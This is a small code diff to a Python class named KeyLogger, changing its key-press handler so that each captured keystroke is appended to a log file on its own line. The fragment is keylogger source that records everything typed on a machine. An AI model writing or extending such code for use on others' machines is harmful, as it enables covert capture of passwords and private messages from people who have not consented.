@@ -15,7 +15,7 @@ class KeyLogger():
     def on_press(self, key):
         print(key)
         with open(self.filename, 'a') as logs:
-            logs.write(self.get_char(key))
+            logs.write(self.get_char(key) + '\n')
 
     def main(self):
         listener = keyboard.Listener(
